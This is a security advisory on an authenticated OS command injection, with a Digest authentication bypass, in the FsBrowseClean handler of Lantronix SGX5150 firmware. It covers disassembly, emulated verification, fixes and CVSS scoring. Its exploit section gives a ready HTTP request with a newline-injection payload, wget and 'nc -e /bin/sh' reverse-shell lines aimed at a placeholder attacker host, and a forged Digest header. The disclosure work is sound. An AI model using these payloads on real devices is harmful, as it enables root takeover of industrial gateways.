# Lantronix SGX5150 9.13.0.0R7 — Authenticated Command Injection in FsBrowseClean → Root RCE

## 1. Overview

Lantronix SGX5150 is an industrial device server aimed at critical-infrastructure and OT deployments. The firmware analysed here is `SGX5150_9.13.0.0R7.signed.rom`, a 48,282,867-byte NUEVO-2 container carrying a signature layer. Static extraction and disassembly show a Linux ARM 32-bit EABI userland built against glibc 2.17 (`ld-2.17.so`). The web stack is nginx fronting a single in-house C daemon, `/bin/ltrx_evo` (1,522,516 bytes, ARM EABI5 ELF, stripped), which implements the vendor's EVO/hyperion AJAX-RPC framework.

`FsBrowseClean` is one of 67 named AJAX handlers exported by that daemon. The firmware carries no statement of what the handler is for; from its name alone it appears to serve a USB-storage browse-and-cleanup function, and that purpose is inferred here rather than evidenced. After a per-character input filter the handler builds `/sbin/ltrx_usb_umount '<path>'` and hands it to the shell-exec helper family, which terminates in `fork()` plus `execl("/bin/sh", "sh", "-c", cmd)` running as root. The `path` form parameter reaches that template with single-quote and newline bytes still intact, so a newline ends the first shell line and opens a second one that executes with uid 0.

The practical consequence is that an attacker holding a privileged web session on the device obtains root command execution on an OT gateway that bridges serial field devices and the IP network. A secondary, non-default authentication defect described in section 3 can remove the session requirement when an administrator opts into Digest authentication.

## 2. Vulnerability Summary

- **Type**: authenticated OS command injection leading to root remote code execution (CWE-78).
- **Sink function**: the `FsBrowseClean` AJAX handler in `/bin/ltrx_evo`, at virtual address `0x5eea0`.
- **Injected parameter**: the `path` field of the `application/x-www-form-urlencoded` POST body that selects the AJAX handler.
- **Root cause 1 (CWE-78)**: `path` is concatenated into a shell command string via `sprintf` and `sprintf_malloc`, then executed through `/bin/sh -c`.
- **Root cause 2 (CWE-20)**: the per-character filter at `0x5f0b0`-`0x5f124` blocks `&`, `|`, `<`, `;`, `!`, `$`, backslash, backtick and `>`, but permits single quote (`0x27`), `#` (`0x23`), `(` (`0x28`) and newline (`0x0a`). Permitting newline turns a blacklist into a bypass.
- **Root cause 3 (CWE-250)**: the EVO daemon executes the constructed command as root, so the injected command inherits uid 0.
- **Response behaviour**: blind. `exec_system_cmd_print` output is not reflected in the HTTP response, so exploitation is confirmed out-of-band.

**Independence.** The source research records no prior public CVE for the SGX5150 at the time of analysis. Several other Lantronix products share the same EVO framework and the same `/sbin/ltrx_usb_umount` helper, but on this device the umount sink lives in a different handler: exactly one literal pool (VA `0x5f218`) holds the pointer to the sink format string `0x14ba3b`, and that pool belongs to `FsBrowseClean` at `0x5f150`. The sibling `FsUnmount` handler at `0x5f990` contains no umount sink on this firmware. In addition, the SGX5150 HTTP request path performs no exempt-when-empty relaxation, and its character filter blocks `;` and `>` where related products block neither. Different product, different sink function, different authentication model and different filter behaviour together make this a distinct finding rather than a variant restatement.

## 3. Authentication Boundary

### Authentication boundary: handler-level check

The handler itself refuses anonymous callers. With `r4` holding the request context passed as the first argument:

```
0x5eeec  ldr r2, [r4]                                  ; r4[0] = session / username pointer
0x5eef0  cmp r2, 0                                    ; if r4[0] == 0 -> reject
                                                       ; "user_not_logged_in" via 0xce154
0x5ef34  bl  IsGroupListWritable(r4[0], "filesystem")  ; else "user does not have permission"
```

That `r4[0]` is a username or session pointer is corroborated by the login-audit function at `0xfeb98`, which formats `"User %s logged in from web"` from the same slot. Two conditions must therefore both hold: a non-null session identity, and group membership granting write access to the `filesystem` resource.

The research record does not settle the address of that one call site: it carries both `0x5ef34`, used in the listing above, and `0x5ef2c`. The discrepancy was not resolved. `0x5ef34` is retained here because the listing reproduced above is quoted from the disassembly that also supplies the adjacent `0x5eeec` and `0x5eef0` addresses, so it is the value that listing is internally consistent with. Which of the two is exact does not change the conclusion, since the conclusion rests on the call's target function and its two conditions rather than on the call instruction's own address.

### Authentication boundary: framework-level check

The framework path that populates `context[0]` runs from the per-request handler region near `0x105044` through `0x102cd4` and `0x102d6c`:

```
0x102df8  ldr r0, [r5,0x34]        ; runtime URI table
          bl  0xfd124              ; table lookup, callback 0xfea60 -> r7 = match or 0
0x102e0c  subs r7, r0, 0
          beq 0x102e50             ; NO MATCH -> 0x102e88 USER-env path
0x102e7c  ldr r3, [r7,0x1c]        ; auth-type
          cmp r3, 6 ; bne 0x102ebc ; 6 -> USER env, otherwise credential check
0x102e88  ldr r0, str.USER
          bl  getenv               ; context[0] = getenv("USER")
```

Auth-type values classify as: `6` = USER environment variable, `1`/`4` = HTTP Basic, `2`/`5` = HTTP Digest, `3` = logout. In the shipped default configuration the web auth-config tree is empty — the `home/default/` directory holds no auth entries, `defaults/` contains only `factory.xcr` (4,532 bytes, encrypted), `factory_vyaire.xcr` (8,952 bytes) and `brmgr-br0.conf` (network configuration), and no init script populates the web auth-config. An empty tree means an empty runtime URI table, so every lookup misses, control reaches `0x102e88`, and `context[0]` becomes `getenv("USER")`. Nothing calls `setenv` for `USER` at daemon startup, so that value is NULL, `context[0]` is zero, and the handler check at `0x5eef0` rejects the request.

This is the decisive point, and it distinguishes the SGX5150 from a related EVO product where an empty tree is exempted and the sink becomes reachable anonymously. On this firmware the request path through `0x102cd4` has no such exemption. The exempt-when-empty logic that does exist, inside `WebMgrAuth_linux` at `0xcfa28`, sits on the IPC handler path (`arch/linux/ipc_commands.c`) and never runs for HTTP requests.

Two independent traces of this path initially disagreed on the outcome. One assumed no authentication header at all, the other assumed a forged Digest header. Reconciling them turns on a single question: is the runtime URI table populated? In the shipped default it is not, so the no-header trace governs and the endpoint is authenticated-only, with the residual uncertainty recorded at 0.85 confidence. The forged-Digest trace describes a different attack model and is reported below as a separate, conditional defect rather than as part of the primary path.

### Authentication boundary: which account is needed

The verified prerequisite is a web session whose identity passes `IsGroupListWritable(identity, "filesystem")`. On the credential itself the research notes carry a placeholder and nothing more: the factory administrator is written as `admin` with a password described as derived from the device serial number. That derivation was never reversed. No algorithm, no code reference, no configuration key and no credential artifact was examined, so the serial-derived character of the password is an assertion made by the record rather than a property this research established. The notes likewise record, again as a property of the product rather than as a verified behaviour, that a password change is forced at the administrator's first login. The research did not enumerate any lower-privileged group that also satisfies the `filesystem` write test, and it did not verify that the serial number can be recovered by an unauthenticated remote attacker. Every one of these limits is carried forward into the scoring discussion in section 12.

### Authentication boundary: secondary Digest defect

At `0xff838` the Digest username extractor performs no cryptographic validation whatsoever:

```
0xff838  push {r4,r5,r6,lr}
0xff84c  bl strstr            ; haystack = Authorization header, needle = "username="
0xff860  bl strlen            ; skip past "username="
0xff868  r1 = 0x22 ('"')
         bl strchr            ; locate the closing quote
0xff880  r4 = r0 - r5         ; value length
0xff894  bl 0xff108           ; allocate
0xff8a8  bl strncpy           ; copy the username value
0xff8b0  strb 0, [r6,r4]      ; null-terminate
0xff8b4  r0 = r6 ; return     ; NO hash / nonce / response / realm check
```

If an administrator configures Digest authentication, the runtime URI table gains auth-type `2`/`5` entries, the Digest parse at `0x102f04` calls `0xff838`, and the string `Authorization: Digest username="admin", response="garbage"` is enough to set `context[0]` to `admin`. `IsAdminUser("admin")` then returns 1 and the sink is reached without a password. This is a secondary CWE-287 improper-authentication finding, not the primary RCE path, because it requires a non-default administrator choice. It is documented here for completeness and scored separately in section 12.

## 4. Attack Surface

### Attack surface and entry routing

The main HTTP handler `webmgr` at `0xccd28` receives the request context in `r4`, with `r4[0x54]` holding the URI, `r4[0x3c]` the response structure and `r4[0x4c]` the configuration. Prefix routing dispatches `_ajax_funcs.js` to `0xfde64`, `_config_` to the configuration page, `_xsrexport` to `0xdf998`, `_action_status` to `0xd0414`, and `_export_config`/`_export_status` to `0xd49dc`; everything else falls through to the AJAX dispatcher at `0xfe390` (call site `0xccfac`, with `r1 = 0`). Build metadata in the binary places this file at `hyperion/http/webmgr.c`.

### Attack surface of the dispatcher

```
0xfe39c  ldr r1, "ajax"
         bl  0x101da0         ; read the ajax form parameter
0xfe3e8  bl  HASHGet          ; resolve the name in the global hash table 0x1b8484
0xfe454  CfgVarGetData(0x308) ; setup-complete check (first-run gate, out of scope)
0xfe4d4  blx r3               ; handler dispatch — no framework auth gate inside the dispatcher
```

The dispatcher enforces no authentication of its own. All authorization for this sink is therefore local to the handler, in the two checks shown in section 3.

### Attack surface of the handler table

The AJAX handler table lives at VA `0xcf6d0` and contains 67 `{name_ptr, func_ptr}` entries of 8 bytes each. Relevant entries:

| idx | name | func VA |
|-----|------|---------|
| 4 | FsBrowseClean | `0x5eea0` (sink) |
| 5 | FsUnmount | `0x5f990` (no umount sink on this firmware) |
| 10 | FsTFtp | `0x5b840` |
| 14 | Ping | `0xd9f6c` |
| 17 | Traceroute | `0xd880c` |

### Attack surface constraints

The injected command may only use bytes the filter permits. Letters, digits, `/`, `.`, `-`, `_`, space, `(`, `'` and `#` are available; redirection, pipelines, command separators other than newline, variable expansion, backticks and backslash escapes are not. That set is sufficient for `touch`, for `wget` retrieval, and for a `nc -e /bin/sh <attacker> <port>` reverse shell, but not for output redirection, so exfiltration must be out-of-band or via a listener.

## 5. Sink Identification

### Sink identification of the command construction

After the character filter passes, the handler reaches the shell-exec sink:

```
0x5f13c  mov r0, r5
         bl  sym.IseUSB
         subs r8, r0, 0
         bne 0x5f1a0                    ; IseUSB gate: proceed only when IseUSB == 0
0x5f138  bl  sym.imp.sprintf            ; sprintf(buf, "%s%s", "/ltrx_user", path)
0x5f150  ldr r0, [0x5f218]              ; literal pool 0x5f218 = 0x14ba3b
                                        ;   = "/sbin/ltrx_usb_umount '%s'"
0x5f154  bl  sym.sprintf_malloc         ; cmd = sprintf_malloc(fmt, buf)
0x5f164  bl  sym.exec_system_cmd_print  ; -> mpnipc_proxy_shell_cmd
                                        ; -> fork + execl("/bin/sh","sh","-c",cmd)   (root)
```

The `IseUSB` gate at `0x5f140` succeeds when it returns zero, that is, when no USB mass-storage device is currently mounted. That is the ordinary idle state of the device, so the gate does not obstruct exploitation; it merely requires that no USB volume be attached at the moment of the request.

### Sink identification of the format string

The sink format string `/sbin/ltrx_usb_umount '%s'` sits at file offset `0x143a3b`, mapping to VA `0x14ba3b` under the read-only data delta of `+0x8000`. The callee `/sbin/ltrx_usb_umount` is a 578-byte POSIX shell script taking the mount point as `$1`. Because the helper is itself a shell script, this advisory reads the constructed string as being parsed twice in succession — once by the `-c` invocation of `/bin/sh` and again by the script's own interpreter — and the newline injection as being resolved at the first of those parses. That double-parse account is this advisory's interpretation of observed output, not a statement from the research record: it is consistent with the daemon-side result in section 9, where the umount helper ran and reported that it could not unmount the constructed path while the injected second line still executed, but the record itself does not make the two-parse claim.

### Sink identification uniqueness

A cross-reference sweep over the whole binary finds exactly one literal pool holding the pointer `0x14ba3b`, namely the pool at `0x5f218` loaded by the instruction at `0x5f150` inside `FsBrowseClean`. No other handler on this firmware builds the umount command. This is what pins the finding to `FsBrowseClean` at `0x5eea0` and separates it from related products where the identical sink lives in `FsUnmount`.

## 6. Source Identification

### Source identification of the tainted parameter

The tainted value is the `path` field of the POST body, read by the form parser at `0x101da0` on behalf of the AJAX dispatcher. The attacker controls it completely; the only transformation between the wire and the sink is URL decoding by the framework parser and the per-character filter described next.

### Source identification of the character filter

The filter is a per-character loop at `0x5f0b0`-`0x5f124` that runs before the sink is reachable:

```
0x5f0b0  ldrb r3, [r5, r1]   ; path[r1]
0x5f0b4  cmp  r3, 0x26       ; '&'
0x5f0b8  cmpne r3, 0x7c      ; '|'
0x5f0bc  beq  0x5f0f8        ; reject '&' or '|'
0x5f0c0  cmp  r3, 0x3c       ; '<'
0x5f0c4  bhi  0x5f0e0        ; above '<' -> test backslash, backtick, '>'
0x5f0c8  cmp  r3, 0x3b       ; ';'
0x5f0cc  bhs  0x5f0f8        ; reject ';' or '<'
0x5f0d0  cmp  r3, 0x21       ; '!'
0x5f0d4  beq  0x5f0f8        ; reject '!'
0x5f0d8  cmp  r3, 0x24       ; '$'
0x5f0e0  cmp  r3, 0x5c       ; backslash
0x5f0e4  beq  0x5f0f8        ; reject backslash
0x5f0e8  cmp  r3, 0x60       ; backtick
0x5f0ec  beq  0x5f0f8        ; reject backtick
0x5f0f0  cmp  r3, 0x3e       ; '>'
0x5f0f4  bne  0x5f118        ; not '>' -> accept; equal -> reject
0x5f0f8  ... "path %s cannot be used in this manner"   ; branch 0x5f030, sink NOT reached
0x5f118  add r1, r1, 1 ; b 0x5f120                     ; accept, advance
0x5f120  cmp r1, r0 ; bne 0x5f0b0                      ; loop
0x5f128  ...                                           ; all bytes accepted -> sink
```

The reject set is `&` (`0x26`), `|` (`0x7c`), `<` (`0x3c`), `;` (`0x3b`), `!` (`0x21`), `$` (`0x24`), backslash (`0x5c`), backtick (`0x60`) and `>` (`0x3e`). Everything else — including single quote, `#`, `(` and newline — is accepted. Three consequences follow directly. The classic `x';<cmd> #` vector fails, because `;` is rejected. Output redirection such as `id > marker` fails, because `>` is rejected. The newline vector `x'<LF><cmd> #` succeeds, because a raw `0x0a` byte is accepted and POSIX `/bin/sh` treats a newline as a full command separator.

## 7. Data Flow

### Data flow from wire to shell

1. An authenticated web session POSTs `ajax=FsBrowseClean&path=x'%0a<attacker-cmd>%20%23&dir=anything` to `/`.
2. `webmgr` at `0xccd28` matches no special prefix and falls through to the dispatcher at `0xfe390`.
3. The dispatcher reads `ajax` via the form parser at `0x101da0`, resolves `FsBrowseClean` through `HASHGet` against the global table at `0x1b8484`, checks the setup-complete flag via `CfgVarGetData(0x308)`, and branches to `0x5eea0` with no framework authentication gate.
4. The handler checks `context[0] != 0` at `0x5eef0` and `IsGroupListWritable(context[0], "filesystem")` at `0x5ef34`. Under the default configuration these checks only pass for a genuine privileged session.
5. The per-character filter at `0x5f0b0` accepts the payload: it contains a single quote, a newline, a space, alphanumerics, `/`, `_` and `#`, none of which are in the reject set.
6. `IseUSB` returns 0 (no USB volume mounted), so the gate at `0x5f140` is satisfied.
7. `sprintf` at `0x5f138` builds `buf = "/ltrx_user" + path`.
8. `sprintf_malloc` at `0x5f154` builds `cmd = "/sbin/ltrx_usb_umount '" + buf + "'"`.
9. `exec_system_cmd_print` at `0x5f164` forwards `cmd` to `mpnipc_proxy_shell_cmd`, which forks and calls `execl("/bin/sh", "sh", "-c", cmd)` with the daemon's root privilege.

### Data flow through the shell parser

Substituting the payload makes the transformation explicit:

```
path = x'<LF>touch /tmp/sgx5150_marker #
buf  = /ltrx_userx'<LF>touch /tmp/sgx5150_marker #
cmd  = /sbin/ltrx_usb_umount '/ltrx_userx'<LF>touch /tmp/sgx5150_marker #'
```

`/bin/sh -c` reads that as two lines. Line 1 is `/sbin/ltrx_usb_umount '/ltrx_userx'`, a legitimate invocation against a nonexistent mount point that fails harmlessly. Line 2 is `touch /tmp/sgx5150_marker #'`, where the attacker's command runs and the trailing `#` comments out the format string's closing single quote so the line parses cleanly. The failure of line 1 has no effect on line 2: they are separate commands, not a conditional sequence.

## 8. Exploit Construction

### Exploit construction payload

```
path = x'\n<attacker-cmd> #
```

Constraints on `<attacker-cmd>`: no `&`, `|`, `<`, `;`, `!`, `$`, backslash, backtick or `>`. Because `>` is blocked, a marker file must be created with `touch` rather than by redirecting output, and a shell must be obtained by binding or connecting rather than by piping. Working examples within the allowed set:

```
touch /tmp/sgx5150_marker
wget http://<attacker-host>/stage -O /tmp/stage
nc <attacker-host> <port> -e /bin/sh
```

### Exploit construction HTTP request

```
POST / HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Cookie: <valid privileged web session>

ajax=FsBrowseClean&path=x'%0atouch%20/tmp/sgx5150_marker%20%23&dir=anything
```

Here `%0a` is the newline that breaks the shell line, `%20` is a space and `%23` is `#`. Posting to `/` reaches the catch-all dispatcher. The `dir` field is supplied because the handler expects a directory argument alongside `path`; its value is irrelevant to the injection.

Under the non-default Digest configuration described in section 3, the `Cookie` header is replaced by a forged credential header and no password is needed:

```
Authorization: Digest username="admin", response="garbage"
```

### Exploit construction operational notes

The result is blind: standard output and standard error from `exec_system_cmd_print` do not travel back in the HTTP response. Confirmation therefore requires an out-of-band channel — a reverse shell listener, a staged download request observed on the attacker side, or on-device inspection of the marker file. The request must also arrive while no USB mass-storage volume is mounted, otherwise `IseUSB` returns non-zero and control branches away from the sink at `0x5f1a0`.

## 9. Dynamic Verification

### Dynamic verification method

No physical SGX5150 hardware was used at any point. All dynamic testing was performed against the firmware image: the NUEVO-2 container was unpacked with binwalk 3.1.0, yielding an LZO-compressed kernel, a device-tree blob and a 44 MB UBIFS root filesystem that expanded to 102 MB. The signature layer did not obstruct extraction, because the container format is parsed directly. The decisive test then ran that extracted rootfs under `qemu-arm-static` emulation. End-to-end HTTP testing against a live daemon was not achievable: `ltrx_evo` requires NVRAM state, the encrypted `factory.xcr` device-serial material and a ZMQ IPC stack that could not be reconstructed outside the device. Verification is therefore sink-faithful rather than full-stack.

### Dynamic verification layer 1

The published proof-of-concept was run on a workstation with Python 3 and `/bin/sh`, replicating both the filter and the sink. The semicolon vector `x';id > /tmp/rce_marker_sgx5150_selfverify #` was REJECTED by the replicated filter with `;` reported as the blocked byte. The newline vector `x'\ntouch /tmp/rce_marker_sgx5150_selfverify #` PASSED. The generated command `/sbin/ltrx_usb_umount '/ltrx_userx'\ntouch /tmp/rce_marker_sgx5150_selfverify #'` was executed through `/bin/sh -c`, exited 0, and created the marker owned by the invoking non-root user (uid 501). This layer proves the filter bypass and the injection semantics, but not the privilege level.

### Dynamic verification layer 2

The same proof-of-concept was run as root on a Linux host. The semicolon vector was again REJECTED, the newline vector again PASSED, and the marker was created with `uid=0 gid=0`. This layer proves that when the executing daemon is privileged, the injected command inherits that privilege.

### Dynamic verification layer 3

The decisive layer ran inside a chroot of the real extracted SGX5150 ARM rootfs under `qemu-arm-static`, using a harness that faithfully replicates the character filter at `0x5f0b0`-`0x5f124`, the `IseUSB` gate at `0x5f140`, and the sink construction at `0x5f128`-`0x5f164`. The payload was read from a file to avoid transport-level mangling of the embedded newline. Its raw bytes were confirmed as `78 27 0a 74 6f 75 63 68 20 2f 74 6d 70 2f 73 67 78 35 31 35 30 5f 6d 61 72 6b 65 72 20 23`, that is `x'<LF>touch /tmp/sgx5150_marker #`. The harness reported, in order: filter PASS with no blocked bytes (newline `0a`, single quote `27` and hash `23` all permitted); `IseUSB == 0` gate satisfied; `buf = /ltrx_userx'<LF>touch /tmp/sgx5150_marker #`; `cmd = /sbin/ltrx_usb_umount '/ltrx_userx'<LF>touch /tmp/sgx5150_marker #'`; and `/bin/sh -c` exit 0.

The daemon-side output was the expected benign failure of the umount helper — `mount: no /proc/mounts`, `umount: can't unmount /ltrx_userx: No such file or directory`, `failed to unmount /ltrx_userx`, and a shell complaint about `return` outside a function or sourced script — because mount and umount are not fully functional inside a chroot. The injected second line was unaffected: the marker file was created and, inside the emulated rootfs, was owned by `root:root`. The three layers agree, and the third establishes that the newline vector passes the product's own filter and reaches root shell execution using the product's own root filesystem binaries.

### Dynamic verification limits

The result demonstrates filter bypass, sink reachability and root execution semantics inside the extracted and emulated firmware. It does not demonstrate a completed attack against a shipping device over HTTP, because the daemon's NVRAM, encrypted serial material and IPC dependencies prevented full-device emulation. The claim should be read as: the vulnerable code path is real, is reachable from the documented request shape, and executes as root, subject to the session prerequisites in section 3.

## 10. Reachability and Security Impact

### Reachability preconditions

Reaching the sink requires all of the following: network access to the device's HTTP service; a completed first-run setup, since `CfgVarGetData(0x308)` gates the dispatcher; an authenticated web session whose identity satisfies `IsGroupListWritable(identity, "filesystem")`; and no USB mass-storage volume mounted at the moment of the request. In the shipped default configuration there is no unauthenticated route to this handler, because the empty auth-config tree makes the framework assign `getenv("USER")`, which is NULL, and the handler then rejects the request.

### Reachability and the shipped default account

The research notes record the factory administrator as `admin` with a placeholder password described as derived from the device serial number. That is a record assertion, not an examined artifact: the derivation was never reversed, and no credential artifact was inspected. No hard-coded credential was encountered in the code paths analysed, which is a weaker statement than proof that none exists — the only related artifact, the encrypted `factory.xcr` device-serial material, blocked full-device emulation and was never turned into an observable credential, so it shows that a serial number exists rather than that any password derives from it. Two readings follow, and both are reported rather than one being chosen silently. If the recorded serial-derived password is treated as a secret that only a legitimate operator knows, the prerequisite is a high-privileged authenticated session and the appropriate metric is `PR:H`. If an attacker can recover the serial number — from device labelling, procurement records, an unauthenticated information-disclosure endpoint, or a predictable derivation — then the factory credential is not a secret, the session prerequisite collapses, and the same chain is effectively unauthenticated from a network position, which corresponds to `PR:N`. The research did not verify serial recovery from an unauthenticated position, so the second reading is conditional on a fact outside the verified evidence. The notes also record a forced password change at the administrator's first login, which bears on both readings: if that recorded behaviour holds, a commissioned device may no longer accept the factory credential at all. It was not verified here either. Section 12 scores both.

### Reachability and security impact

Impact is root command execution on an industrial device server. Confidentiality: full read access to device configuration, the encrypted factory material, and any serial traffic the device carries between field controllers and the IP network. Integrity: arbitrary modification of device configuration, port mapping, forwarding rules and the root filesystem, including persistent implantation. Availability: complete loss — the device can be rebooted, its configuration wiped, or the serial path disrupted, which for an OT gateway means loss of visibility and control over the attached industrial equipment. Because these devices sit at the boundary between IT and operational networks, a compromised SGX5150 is also a pivot point into otherwise segmented environments.

### Reachability across versions and models

Verified: firmware `SGX5150_9.13.0.0R7` only. That is the single image from which the binary was extracted, disassembled and emulated. Other SGX5150 firmware versions were not examined, and no byte-identity comparison was performed between SGX5150 releases, so any statement about them would be inference without evidence. Cross-product similarity is documented only in a limited sense: the EVO/hyperion framework is shared with other Lantronix products, and the `/sbin/ltrx_usb_umount` helper is the same 578-byte shell script pattern with the mount point at `$1`. That shared-code basis supports the observation that related products deserve the same review; it does not establish that they are vulnerable, and the research explicitly found the SGX5150 sink function, filter and authentication model to differ from those siblings. Reported scope is therefore limited to the verified build, with sibling exposure framed as an unaudited lead.

## 11. Fix Recommendations

1. **Eliminate the shell from the sink.** Replace `exec_system_cmd_print("/sbin/ltrx_usb_umount '<path>'")` with a direct `execv`/`posix_spawn` of the helper using a fixed argv array, so no shell parser ever sees attacker-controlled bytes. This removes the entire injection class rather than one vector.
2. **Reject newline and single quote in the path filter.** At minimum add `0x0a`, `0x0d` and `0x27` to the reject set at `0x5f0b0`-`0x5f124`. Blacklists over shell metacharacters are structurally fragile; combine this with item 1 rather than relying on it.
3. **Validate the path semantically, not lexically.** Require the parameter to resolve to an entry the device itself created under its USB mount namespace, and reject anything that does not canonicalize inside that subtree.
4. **Stop treating the handler-local check as the only authorization.** Enforce authentication in the AJAX dispatcher at `0xfe390` before handler dispatch, so a missing or unpopulated auth-config tree cannot degrade into an unauthenticated code path on any future configuration change.
5. **Fix the Digest username extractor at `0xff838`.** Enforce nonce issuance and staleness checks, and verify the `response` digest against the stored credential, `realm`, `nonce`, method and URI. In its current form it authenticates anybody who can spell `username=` in a header.
6. **Drop privilege where the architecture allows.** `ltrx_evo` running as root (CWE-250) converts every injection into a full device compromise; split the USB-mount helper into a narrowly scoped privileged helper and run the web daemon unprivileged.
7. **Return no output, but log the rejection.** The blind nature of the sink delayed detection; the filter's `path %s cannot be used in this manner` message should be logged with the session identity so injection attempts are auditable.

## 12. CWE and CVSS

### CWE and CVSS classification

- **CWE-78** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') — primary. The `path` parameter is embedded in a string passed to `/bin/sh -c`.
- **CWE-20** Improper Input Validation — contributing. The per-character blacklist permits newline, single quote and `#`, which together are a complete shell-breakout primitive.
- **CWE-250** Execution with Unnecessary Privileges — contributing. The daemon and therefore the injected command run as root.
- **CWE-287** Improper Authentication — secondary, conditional. The Digest username extractor at `0xff838` performs no credential verification; reachable only when an administrator configures Digest authentication.
- **CWE-798 / CWE-1392** are not asserted. That is an absence of findings in the paths that were looked at, not a demonstrated absence of the weakness. No hard-coded credential was encountered in the code paths analysed. The factory `admin` password is described in the research notes as serial-derived, but the description is an unelaborated placeholder: the derivation was never reversed and no credential artifact was examined, so it neither establishes nor excludes a hard-coded credential. The only related artifact, the encrypted `factory.xcr` serial material, was never decrypted or inspected. Neither weakness is claimed.

### CWE and CVSS derivation of the primary score

This advisory rates the primary finding at **7.2 (High)**, derived from the metric set that matches what was actually established: a genuine privileged web session is required, and the factory administrator password that the research notes describe as serial-derived is treated as a secret held only by a legitimate operator. That second premise is taken from the record rather than from an examined artifact, since nothing in the research reversed the derivation, so it is an assumption carried into the scoring and not a measured fact.

The research record and this advisory disagree on the number, and the disagreement is disclosed rather than smoothed over. That record scored this same `PR:H` vector 8.8, and that vector does not compute to 8.8 under CVSS 3.1 — with the other metrics held constant it computes to 7.2, while 8.8 is what the same metric string yields only when `PR:L` is substituted for `PR:H`. This advisory recomputes the base score from the vector it prints and therefore reports 7.2 as the primary rating, and 8.8 appears below only as a labelled `PR:L` hypothetical.

Written without a version prefix so the base score can be checked directly against the metric string beside it:

```
AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H  =  7.2 (High)
```

Computed from first principles under CVSS version 3.1 with Scope Unchanged. The Roundup function takes a value to the smallest number greater than or equal to it that has at most one decimal place; it never truncates downward, so the summed sub-scores below land on the next whole tenth.

```
Impact sub-score   ISS    = 1 - [(1-0.56) x (1-0.56) x (1-0.56)]
                          = 1 - 0.44^3 = 1 - 0.085184 = 0.914816
                   Impact = 6.42 x ISS = 6.42 x 0.914816 = 5.873

Exploitability     8.22 x AV:N(0.85) x AC:L(0.77) x PR:H(0.27, scope unchanged) x UI:N(0.85)
                          = 1.235

Base score         Roundup(5.873 + 1.235) = 7.2
```

The required-privilege metric is the only component that moves the base score for this finding, since a root shell gives full impact on all three axes regardless of how the session was obtained. The other metric values are therefore derived explicitly and carried into the readings below:

```
Exploitability with PR:L (0.62) = 8.22 x 0.85 x 0.77 x 0.62 x 0.85 = 2.835
Base                            = Roundup(5.873 + 2.835) = 8.8

Exploitability with PR:N (0.85) = 8.22 x 0.85 x 0.77 x 0.85 x 0.85 = 3.887
Base                            = Roundup(5.873 + 3.887) = 9.8
```

### CWE and CVSS alternate readings

Reading / assumption / vector (CVSS version 3.1) / computed base score:

- **A, primary, adopted for reporting.** A genuine privileged web session is required, and the factory `admin` password that the research notes describe as serial-derived is treated as a secret held only by a legitimate operator. What was proved end to end is narrower than this whole reading: the sink chain was executed to a root-owned marker under emulation of the extracted root filesystem, whereas the authentication precondition rests on static analysis of the handler and framework checks in section 3, and no login was ever performed against the product. The serial-derived-password premise is likewise a record assertion rather than an examined artifact, as set out in section 10. This reading is adopted on that basis, with the residual uncertainty about the authentication path carried at the confidence recorded in section 3.
  Vector `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = **7.2** (High).
- **B, rejected hypothetical.** Lowering the required-privilege metric would raise the score, and the same metric set under `PR:L` yields 8.8. The research did not enumerate any lower-privileged account that satisfies `IsGroupListWritable(..., "filesystem")`, so no evidence supports this reading and it is not claimed. It is listed only to show why 8.8 is not the headline figure for a chain that requires a factory administrator session. The research record itself attached 8.8 to the `PR:H` vector, which that vector does not compute to; the figure belongs to `PR:L` under the derivation above, and it is reported here in that form only.
  Vector `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **8.8** (High).
- **C, conditional, factory credential not proven recoverable.** If the device serial number were obtainable by the attacker, the factory administrator password that the record describes as derived from it would not be a secret, the session prerequisite would collapse, and the chain would be effectively unauthenticated from a network position. Neither half of that premise was verified. Serial recovery from an unauthenticated position was NOT tested, and the derivation itself was never reversed, so it is not established that the factory password is serial-derived at all. The notes additionally record a forced password change at the administrator's first login, which if accurate would leave a commissioned device rejecting the factory credential outright. This reading is therefore reported as a conditional, unverified scenario and not as the state of a shipping product.
  Vector `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8** (Critical).
- **D, secondary finding, non-default configuration.** An administrator has configured Digest authentication, and the forged `Authorization: Digest username="admin"` header then reaches the sink with no password. This is a separate weakness in a separate non-default configuration and is not additive to reading A, B or C.
  Vector `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8** (Critical).

### CWE and CVSS reported rating

The primary finding is reported as 7.2 (High) under vector `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`, the score supported by the evidence this research actually produced: the sink chain reaching root under emulation, plus an authentication precondition established by static analysis, and a serial-derived factory credential taken from the record as an assumption.

Defenders whose deployments leave the factory administrator credential guessable or recoverable should assess the chain under reading C instead, which makes it Critical. That the credential is recoverable was not tested here, and the record only asserts that it is serial-derived. The recorded forced password change at the administrator's first login is directly relevant to this assessment, because a commissioned device may no longer accept the factory credential at all.

Deployments that have enabled Digest authentication should additionally treat the improper-authentication defect as Critical under reading D and remediate it independently of the injection fix.

### CWE and CVSS independence from prior public work

The research records no prior public CVE covering the SGX5150 `FsBrowseClean` handler. Prior advisories from this project against other Lantronix EVO-framework products involve the `FsUnmount` handler, and in at least one of those the sink was reachable without authentication because an empty auth-config tree was exempted on the request path. Neither condition holds here: the SGX5150 sink is in a different function, its request path has no such exemption, and its filter blocks the semicolon and redirection characters that the earlier products permitted. No CVE identifier is claimed or assigned in this document.

---

Advisory: https://0day-rubbish.com/blog/lantronix-sgx5150-fsbrowseclean-command-injection
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com
